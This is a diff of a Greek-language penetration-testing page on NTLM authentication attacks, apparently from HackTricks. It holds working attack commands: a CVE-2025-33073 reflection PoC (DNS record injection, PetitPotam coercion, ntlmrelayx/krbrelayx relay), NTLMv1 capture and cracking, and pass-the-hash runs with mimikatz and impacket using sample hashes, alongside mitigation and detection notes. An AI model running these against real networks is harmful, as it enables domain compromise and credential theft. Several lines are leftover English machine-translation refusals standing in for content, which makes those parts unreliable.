@@ -2,57 +2,11 @@
 
 {{#include ../../banners/hacktricks-training.md}}
 
-## NTLM & Kerberos *Reflection* via Serialized SPNs (CVE-2025-33073)
-
-Τα Windows περιέχουν αρκετές μετρήσεις που προσπαθούν να αποτρέψουν τις επιθέσεις *reflection* όπου μια αυθεντικοποίηση NTLM (ή Kerberos) που προέρχεται από έναν υπολογιστή αναμεταδίδεται πίσω στον **ίδιο** υπολογιστή για να αποκτήσει δικαιώματα SYSTEM.
-
-Η Microsoft κατέρριψε τις περισσότερες δημόσιες αλυσίδες με τα MS08-068 (SMB→SMB), MS09-013 (HTTP→SMB), MS15-076 (DCOM→DCOM) και αργότερα patches, ωστόσο **CVE-2025-33073** δείχνει ότι οι προστασίες μπορούν ακόμα να παρακαμφθούν εκμεταλλευόμενοι το πώς ο **πελάτης SMB κόβει τα Service Principal Names (SPNs)** που περιέχουν *marshalled* (σειριοποιημένες) πληροφορίες στόχου.
-
-### TL;DR του σφάλματος
-1. Ένας επιτιθέμενος καταχωρεί ένα **DNS A-record** του οποίου η ετικέτα κωδικοποιεί ένα marshalled SPN – π.χ.
-`srv11UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA → 10.10.10.50`
-2. Το θύμα αναγκάζεται να αυθεντικοποιηθεί σε αυτό το όνομα υπολογιστή (PetitPotam, DFSCoerce, κ.λπ.).
-3. Όταν ο πελάτης SMB περνά τη συμβολοσειρά στόχου `cifs/srv11UWhRCAAAAA…` στο `lsasrv!LsapCheckMarshalledTargetInfo`, η κλήση προς `CredUnmarshalTargetInfo` **αφαιρεί** το σειριοποιημένο blob, αφήνοντας **`cifs/srv1`**.
-4. `msv1_0!SspIsTargetLocalhost` (ή το αντίστοιχο Kerberos) τώρα θεωρεί ότι ο στόχος είναι *localhost* επειδή το σύντομο μέρος του υπολογιστή ταιριάζει με το όνομα υπολογιστή (`SRV1`).
-5. Κατά συνέπεια, ο διακομιστής ρυθμίζει το `NTLMSSP_NEGOTIATE_LOCAL_CALL` και εισάγει το **access-token SYSTEM του LSASS** στο πλαίσιο (για το Kerberos δημιουργείται ένα κλειδί υποσυστήματος με σήμανση SYSTEM).
-6. Η αναμετάδοση αυτής της αυθεντικοποίησης με το `ntlmrelayx.py` **ή** `krbrelayx.py` δίνει πλήρη δικαιώματα SYSTEM στον ίδιο υπολογιστή.
-
-### Quick PoC
-```bash
-# Add malicious DNS record
-dnstool.py -u 'DOMAIN\\user' -p 'pass' 10.10.10.1 \
--a add -r srv11UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA \
--d 10.10.10.50
-
-# Trigger authentication
-PetitPotam.py -u user -p pass -d DOMAIN \
-srv11UWhRCAAAAAAAAAAAAAAAAA… TARGET.DOMAIN.LOCAL
-
-# Relay listener (NTLM)
-ntlmrelayx.py -t TARGET.DOMAIN.LOCAL -smb2support
-
-# Relay listener (Kerberos) – remove NTLM mechType first
-krbrelayx.py -t TARGET.DOMAIN.LOCAL -smb2support
-```
-### Patch & Mitigations
-* Το KB patch για **CVE-2025-33073** προσθέτει έναν έλεγχο στο `mrxsmb.sys::SmbCeCreateSrvCall` που μπλοκάρει οποιαδήποτε SMB σύνδεση της οποίας ο στόχος περιέχει μαρσαρισμένες πληροφορίες (`CredUnmarshalTargetInfo` ≠ `STATUS_INVALID_PARAMETER`).
-* Εφαρμόστε **SMB signing** για να αποτρέψετε την αντανάκλαση ακόμη και σε μη ενημερωμένους διακομιστές.
-* Παρακολουθήστε τις εγγραφές DNS που μοιάζουν με `*<base64>...*` και μπλοκάρετε τους συντελεστές καταναγκασμού (PetitPotam, DFSCoerce, AuthIP...).
-
-### Detection ideas
-* Δίκτυα καταγραφών με `NTLMSSP_NEGOTIATE_LOCAL_CALL` όπου η IP του πελάτη ≠ η IP του διακομιστή.
-* Kerberos AP-REQ που περιέχει ένα κλειδί υποσυστήματος και έναν πελάτη principal ίσο με το όνομα του διακομιστή.
-* Windows Event 4624/4648 SYSTEM logons που ακολουθούνται αμέσως από απομακρυσμένες SMB εγγραφές από τον ίδιο διακομιστή.
-
-## References
-* [Synacktiv – NTLM Reflection is Dead, Long Live NTLM Reflection!](https://www.synacktiv.com/en/publications/la-reflexion-ntlm-est-morte-vive-la-reflexion-ntlm-analyse-approfondie-de-la-cve-2025.html)
-* [MSRC – CVE-2025-33073](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-33073)
-
 ## Basic Information
 
-Σε περιβάλλοντα όπου λειτουργούν **Windows XP και Server 2003**, χρησιμοποιούνται LM (Lan Manager) hashes, αν και είναι ευρέως αναγνωρισμένο ότι αυτά μπορούν να παραβιαστούν εύκολα. Ένα συγκεκριμένο LM hash, `AAD3B435B51404EEAAD3B435B51404EE`, υποδηλώνει μια κατάσταση όπου το LM δεν χρησιμοποιείται, αντιπροσωπεύοντας το hash για μια κενή συμβολοσειρά.
+Σε περιβάλλοντα όπου λειτουργούν **Windows XP και Server 2003**, χρησιμοποιούνται οι κατακερματισμοί LM (Lan Manager), αν και είναι ευρέως αναγνωρισμένο ότι μπορούν να παραβιαστούν εύκολα. Ένας συγκεκριμένος κατακερματισμός LM, `AAD3B435B51404EEAAD3B435B51404EE`, υποδεικνύει μια κατάσταση όπου δεν χρησιμοποιείται το LM, αντιπροσωπεύοντας τον κατακερματισμό για μια κενή συμβολοσειρά.
 
-Από προεπιλογή, το **Kerberos** είναι το κύριο μέθοδος που χρησιμοποιείται. Το NTLM (NT LAN Manager) εισέρχεται υπό συγκεκριμένες συνθήκες: απουσία Active Directory, μη ύπαρξη τομέα, δυσλειτουργία του Kerberos λόγω κακής διαμόρφωσης, ή όταν γίνονται προσπάθειες σύνδεσης χρησιμοποιώντας μια διεύθυνση IP αντί για έγκυρο όνομα διακομιστή.
+Από προεπιλογή, το πρωτόκολλο αυθεντικοποίησης **Kerberos** είναι η κύρια μέθοδος που χρησιμοποιείται. Το NTLM (NT LAN Manager) εισέρχεται υπό συγκεκριμένες συνθήκες: απουσία Active Directory, μη ύπαρξη τομέα, δυσλειτουργία του Kerberos λόγω ακατάλληλης διαμόρφωσης ή όταν γίνονται προσπάθειες σύνδεσης χρησιμοποιώντας μια διεύθυνση IP αντί για έγκυρο όνομα κεντρικού υπολογιστή.
 
 Η παρουσία της κεφαλίδας **"NTLMSSP"** σε πακέτα δικτύου σηματοδοτεί μια διαδικασία αυθεντικοποίησης NTLM.
 
@@ -60,8 +14,8 @@ krbrelayx.py -t TARGET.DOMAIN.LOCAL -smb2support
 
 **Key Points**:
 
-- Οι LM hashes είναι ευάλωτες και ένα κενό LM hash (`AAD3B435B51404EEAAD3B435B51404EE`) υποδηλώνει την μη χρήση του.
-- Το Kerberos είναι η προεπιλεγμένη μέθοδος αυθεντικοποίησης, με το NTLM να χρησιμοποιείται μόνο υπό συγκεκριμένες συνθήκες.
+- Οι κατακερματισμοί LM είναι ευάλωτοι και ένας κενός κατακερματισμός LM (`AAD3B435B51404EEAAD3B435B51404EE`) υποδηλώνει την μη χρήση του.
+- Το Kerberos είναι η προεπιλεγμένη μέθοδος αυθεντικοποίησης, με το NTLM να χρησιμοποιείται μόνο υπό ορισμένες συνθήκες.
 - Τα πακέτα αυθεντικοποίησης NTLM είναι αναγνωρίσιμα από την κεφαλίδα "NTLMSSP".
 - Τα πρωτόκολλα LM, NTLMv1 και NTLMv2 υποστηρίζονται από το σύστημα αρχείο `msv1\_0.dll`.
 
@@ -109,7 +63,7 @@ reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa\ /v lmcompatibilitylevel /t RE
 
 Το **μήκος της πρόκλησης είναι 8 bytes** και η **απάντηση είναι 24 bytes**.
 
-Το **hash NT (16bytes)** χωρίζεται σε **3 μέρη των 7bytes το καθένα** (7B + 7B + (2B+0x00\*5)): το **τελευταίο μέρος γεμίζει με μηδενικά**. Στη συνέχεια, η **πρόκληση** κρυπτογραφείται **χωριστά** με κάθε μέρος και τα **αποτελέσματα** των κρυπτογραφημένων bytes **ενώνονται**. Σύνολο: 8B + 8B + 8B = 24Bytes.
+Το **hash NT (16bytes)** χωρίζεται σε **3 μέρη των 7bytes το καθένα** (7B + 7B + (2B+0x00\*5)): το **τελευταίο μέρος γεμίζει με μηδενικά**. Στη συνέχεια, η **πρόκληση** κρυπτογραφείται **χωριστά** με κάθε μέρος και τα **αποτελέσματα** κρυπτογραφημένων bytes **ενώνονται**. Σύνολο: 8B + 8B + 8B = 24Bytes.
 
 **Προβλήματα**:
 
@@ -123,15 +77,15 @@ reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa\ /v lmcompatibilitylevel /t RE
 
 Σήμερα γίνεται όλο και λιγότερο συνηθισμένο να βρίσκονται περιβάλλοντα με ρυθμισμένη Unconstrained Delegation, αλλά αυτό δεν σημαίνει ότι δεν μπορείτε να **καταχραστείτε μια υπηρεσία Print Spooler** που είναι ρυθμισμένη.
 
-Μπορείτε να καταχραστείτε κάποια διαπιστευτήρια/συνδέσεις που ήδη έχετε στο AD για να **ζητήσετε από τον εκτυπωτή να αυθεντικοποιηθεί** έναντι κάποιου **host υπό τον έλεγχό σας**. Στη συνέχεια, χρησιμοποιώντας `metasploit auxiliary/server/capture/smb` ή `responder` μπορείτε να **ρυθμίσετε την πρόκληση αυθεντικοποίησης σε 1122334455667788**, να καταγράψετε την προσπάθεια αυθεντικοποίησης, και αν έγινε χρησιμοποιώντας **NTLMv1** θα μπορείτε να το **σπάσετε**.\
+Μπορείτε να καταχραστείτε κάποια διαπιστευτήρια/συνδέσεις που ήδη έχετε στο AD για να **ζητήσετε από τον εκτυπωτή να αυθεντικοποιηθεί** κατά ενός **host υπό τον έλεγχό σας**. Στη συνέχεια, χρησιμοποιώντας `metasploit auxiliary/server/capture/smb` ή `responder` μπορείτε να **ρυθμίσετε την πρόκληση αυθεντικοποίησης σε 1122334455667788**, να καταγράψετε την προσπάθεια αυθεντικοποίησης, και αν έγινε χρησιμοποιώντας **NTLMv1** θα μπορείτε να την **σπάσετε**.\
 Αν χρησιμοποιείτε `responder` μπορείτε να προσπαθήσετε να **χρησιμοποιήσετε τη σημαία `--lm`** για να προσπαθήσετε να **υποβαθμίσετε** την **αυθεντικοποίηση**.\
 _Σημειώστε ότι για αυτή την τεχνική η αυθεντικοποίηση πρέπει να πραγματοποιηθεί χρησιμοποιώντας NTLMv1 (το NTLMv2 δεν είναι έγκυρο)._
 
-Θυμηθείτε ότι ο εκτυπωτής θα χρησιμοποιήσει τον λογαριασμό υπολογιστή κατά την αυθεντικοποίηση, και οι λογαριασμοί υπολογιστή χρησιμοποιούν **μακριούς και τυχαίους κωδικούς πρόσβασης** που πιθανώς **δεν θα μπορείτε να σπάσετε** χρησιμοποιώντας κοινά **λεξικά**. Αλλά η **αυθεντικοποίηση NTLMv1** **χρησιμοποιεί DES** ([περισσότερες πληροφορίες εδώ](#ntlmv1-challenge)), οπότε χρησιμοποιώντας κάποιες υπηρεσίες ειδικά αφιερωμένες στο σπάσιμο του DES θα μπορείτε να το σπάσετε (μπορείτε να χρησιμοποιήσετε [https://crack.sh/](https://crack.sh) ή [https://ntlmv1.com/](https://ntlmv1.com) για παράδειγμα).
+Θυμηθείτε ότι ο εκτυπωτής θα χρησιμοποιήσει τον λογαριασμό υπολογιστή κατά την αυθεντικοποίηση, και οι λογαριασμοί υπολογιστή χρησιμοποιούν **μακρούς και τυχαίους κωδικούς πρόσβασης** που πιθανώς δεν θα μπορείτε να σπάσετε χρησιμοποιώντας κοινά **λεξικά**. Αλλά η **NTLMv1** αυθεντικοποίηση **χρησιμοποιεί DES** ([περισσότερες πληροφορίες εδώ](#ntlmv1-challenge)), έτσι χρησιμοποιώντας κάποιες υπηρεσίες ειδικά αφιερωμένες στην κρυπτογράφηση DES θα μπορείτε να την σπάσετε (μπορείτε να χρησιμοποιήσετε [https://crack.sh/](https://crack.sh) ή [https://ntlmv1.com/](https://ntlmv1.com) για παράδειγμα).
 
 ### NTLMv1 attack with hashcat
 
-Το NTLMv1 μπορεί επίσης να σπάσει με το NTLMv1 Multi Tool [https://github.com/evilmog/ntlmv1-multi](https://github.com/evilmog/ntlmv1-multi) το οποίο μορφοποιεί τα μηνύματα NTLMv1 με μια μέθοδο που μπορεί να σπάσει με το hashcat.
+Η NTLMv1 μπορεί επίσης να σπάσει με το NTLMv1 Multi Tool [https://github.com/evilmog/ntlmv1-multi](https://github.com/evilmog/ntlmv1-multi) το οποίο μορφοποιεί τα μηνύματα NTLMv1 με μια μέθοδο που μπορεί να σπάσει με hashcat.
 
 Η εντολή
 ```bash
@@ -189,13 +143,13 @@ b4b9b02e6f09a9 # this is part 1
 ./hashcat-utils/src/deskey_to_ntlm.pl bcba83e6895b9d
 bd760f388b6700 # this is part 2
 ```
-I'm sorry, but I need the specific text you want translated in order to assist you. Please provide the content you would like me to translate to Greek.
+I'm sorry, but I need the specific text you want translated in order to assist you. Please provide the content you would like translated to Greek.
 ```bash
 ./hashcat-utils/src/ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788
 
 586c # this is the last part
 ```
-I'm sorry, but I need the specific text you want translated in order to assist you. Please provide the content you would like me to translate to Greek.
+I'm sorry, but I need the specific text you would like me to translate in order to assist you. Please provide the content you want translated.
 ```bash
 NTHASH=b4b9b02e6f09a9bd760f388b6700586c
 ```
@@ -212,7 +166,7 @@ NTHASH=b4b9b02e6f09a9bd760f388b6700586c
 ## Pass-the-Hash
 
 **Μόλις έχετε το hash του θύματος**, μπορείτε να το χρησιμοποιήσετε για να **παριστάνετε** αυτό.\
-Πρέπει να χρησιμοποιήσετε ένα **εργαλείο** που θα **εκτελεί** την **αυθεντικοποίηση NTLM χρησιμοποιώντας** αυτό το **hash**, **ή** μπορείτε να δημιουργήσετε μια νέα **sessionlogon** και να **ενσωματώσετε** αυτό το **hash** μέσα στο **LSASS**, έτσι ώστε όταν οποιαδήποτε **αυθεντικοποίηση NTLM εκτελείται**, αυτό το **hash θα χρησιμοποιείται.** Η τελευταία επιλογή είναι αυτό που κάνει το mimikatz.
+Πρέπει να χρησιμοποιήσετε ένα **εργαλείο** που θα **εκτελεί** την **αυθεντικοποίηση NTLM χρησιμοποιώντας** αυτό το **hash**, **ή** μπορείτε να δημιουργήσετε μια νέα **sessionlogon** και να **ενσωματώσετε** αυτό το **hash** μέσα στο **LSASS**, έτσι ώστε όταν εκτελείται οποιαδήποτε **αυθεντικοποίηση NTLM**, αυτό το **hash θα χρησιμοποιείται.** Η τελευταία επιλογή είναι αυτό που κάνει το mimikatz.
 
 **Παρακαλώ, θυμηθείτε ότι μπορείτε να εκτελέσετε επιθέσεις Pass-the-Hash χρησιμοποιώντας επίσης λογαριασμούς υπολογιστών.**
 
@@ -231,7 +185,7 @@ Invoke-Mimikatz -Command '"sekurlsa::pth /user:username /domain:domain.tld /ntlm
 
 ### Impacket Windows compiled tools
 
-Μπορείτε να κατεβάσετε [impacket binaries για Windows εδώ](https://github.com/ropnop/impacket_static_binaries/releases/tag/0.9.21-dev-binaries).
+Μπορείτε να κατεβάσετε [τα binaries του impacket για Windows εδώ](https://github.com/ropnop/impacket_static_binaries/releases/tag/0.9.21-dev-binaries).
 
 - **psexec_windows.exe** `C:\AD\MyTools\psexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.my.domain.local`
 - **wmiexec.exe** `wmiexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local`
@@ -292,7 +246,7 @@ wce.exe -s <username>:<domain>:<hash_lm>:<hash_nt>
 
 Εάν το NetNTLMv1 δεν γίνει αποδεκτό—λόγω επιβαλλόμενων πολιτικών ασφάλειας, τότε ο επιτιθέμενος μπορεί να αποτύχει να ανακτήσει μια απάντηση NetNTLMv1.
 
-Για να χειριστεί αυτή την περίπτωση, το εργαλείο Internal Monologue ενημερώθηκε: Αποκτά δυναμικά ένα token διακομιστή χρησιμοποιώντας `AcceptSecurityContext()` για να **συλλάβει απαντήσεις NetNTLMv2** εάν αποτύχει το NetNTLMv1. Ενώ το NetNTLMv2 είναι πολύ πιο δύσκολο να σπάσει, εξακολουθεί να ανοίγει ένα μονοπάτι για επιθέσεις relay ή offline brute-force σε περιορισμένες περιπτώσεις.
+Για να χειριστεί αυτή την περίπτωση, το εργαλείο Internal Monologue ενημερώθηκε: Αποκτά δυναμικά ένα token διακομιστή χρησιμοποιώντας `AcceptSecurityContext()` για να **συλλάβει απαντήσεις NetNTLMv2** εάν αποτύχει το NetNTLMv1. Ενώ το NetNTLMv2 είναι πολύ πιο δύσκολο να σπάσει, ανοίγει ακόμα ένα μονοπάτι για επιθέσεις αναμετάδοσης ή offline brute-force σε περιορισμένες περιπτώσεις.
 
 Η PoC μπορεί να βρεθεί στο **[https://github.com/eladshamir/Internal-Monologue](https://github.com/eladshamir/Internal-Monologue)**.
 
@@ -301,7 +255,7 @@ wce.exe -s <username>:<domain>:<hash_lm>:<hash_nt>
 **Διαβάστε έναν πιο λεπτομερή οδηγό για το πώς να εκτελέσετε αυτές τις επιθέσεις εδώ:**
 
 {{#ref}}
-../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
+../../generic-methodologies-and-resources/pentesting-network/`spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md`
 {{#endref}}
 
 ## Parse NTLM challenges from a network capture
@@ -317,10 +271,10 @@ wce.exe -s <username>:<domain>:<hash_lm>:<hash_nt>
 ### TL;DR του σφάλματος
 1. Ένας επιτιθέμενος καταχωρεί ένα **DNS A-record** του οποίου η ετικέτα κωδικοποιεί ένα marshalled SPN – π.χ.
 `srv11UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA → 10.10.10.50`
-2. Το θύμα αναγκάζεται να αυθεντικοποιηθεί σε αυτό το hostname (PetitPotam, DFSCoerce, κ.λπ.).
+2. Το θύμα αναγκάζεται να αυθεντικοποιηθεί σε αυτό το όνομα κεντρικού υπολογιστή (PetitPotam, DFSCoerce, κ.λπ.).
 3. Όταν ο πελάτης SMB περνά τη συμβολοσειρά στόχου `cifs/srv11UWhRCAAAAA…` στη `lsasrv!LsapCheckMarshalledTargetInfo`, η κλήση προς `CredUnmarshalTargetInfo` **αφαιρεί** το σειριοποιημένο blob, αφήνοντας **`cifs/srv1`**.
 4. `msv1_0!SspIsTargetLocalhost` (ή το αντίστοιχο Kerberos) τώρα θεωρεί ότι ο στόχος είναι *localhost* επειδή το σύντομο μέρος του host ταιριάζει με το όνομα υπολογιστή (`SRV1`).
-5. Κατά συνέπεια, ο διακομιστής ρυθμίζει το `NTLMSSP_NEGOTIATE_LOCAL_CALL` και εισάγει **το access-token SYSTEM του LSASS** στο πλαίσιο (για το Kerberos δημιουργείται ένα υποκλειδί υποσυστήματος με σήμανση SYSTEM).
+5. Κατά συνέπεια, ο διακομιστής ρυθμίζει το `NTLMSSP_NEGOTIATE_LOCAL_CALL` και εισάγει **το access-token SYSTEM του LSASS** στο πλαίσιο (για το Kerberos δημιουργείται ένα κλειδί υποσυστήματος με σήμανση SYSTEM).
 6. Η αναμετάδοση αυτής της αυθεντικοποίησης με το `ntlmrelayx.py` **ή** το `krbrelayx.py` δίνει πλήρη δικαιώματα SYSTEM στον ίδιο host.
 
 ### Quick PoC
@@ -343,10 +297,10 @@ krbrelayx.py -t TARGET.DOMAIN.LOCAL -smb2support
 ### Patch & Mitigations
 * Το KB patch για **CVE-2025-33073** προσθέτει έναν έλεγχο στο `mrxsmb.sys::SmbCeCreateSrvCall` που μπλοκάρει οποιαδήποτε SMB σύνδεση της οποίας ο στόχος περιέχει μαρσαρισμένες πληροφορίες (`CredUnmarshalTargetInfo` ≠ `STATUS_INVALID_PARAMETER`).
 * Εφαρμόστε **SMB signing** για να αποτρέψετε την αντανάκλαση ακόμη και σε μη ενημερωμένους διακομιστές.
-* Παρακολουθήστε τα DNS records που μοιάζουν με `*<base64>...*` και μπλοκάρετε τους συνδυασμούς καταναγκασμού (PetitPotam, DFSCoerce, AuthIP...).
+* Παρακολουθήστε τις εγγραφές DNS που μοιάζουν με `*<base64>...*` και μπλοκάρετε τους συνδυασμούς καταναγκασμού (PetitPotam, DFSCoerce, AuthIP...).
 
 ### Detection ideas
-* Δίκτυα καταγραφής με `NTLMSSP_NEGOTIATE_LOCAL_CALL` όπου η IP του πελάτη ≠ η IP του διακομιστή.
+* Δίκτυα καταγραφών με `NTLMSSP_NEGOTIATE_LOCAL_CALL` όπου η IP του πελάτη ≠ η IP του διακομιστή.
 * Kerberos AP-REQ που περιέχει ένα κλειδί υποσυστήματος και έναν πελάτη principal ίσο με το όνομα του διακομιστή.
 * Windows Event 4624/4648 SYSTEM logons που ακολουθούνται αμέσως από απομακρυσμένες SMB εγγραφές από τον ίδιο διακομιστή.
 
